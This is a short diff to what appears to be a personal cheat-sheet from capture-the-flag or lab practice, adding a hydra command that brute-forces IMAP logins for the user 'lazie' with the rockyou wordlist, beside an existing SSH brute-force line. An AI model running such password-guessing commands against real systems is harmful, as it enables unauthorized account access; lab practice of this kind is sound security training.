@@ -30,3 +30,4 @@ exploit -z
 
 # since you have found an username, run hydra
 hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.142.244 ssh
+hydra -t 16 -l lazie -P /usr/share/wordlists/rockyou.txt -vV 10.10.71.62 imap
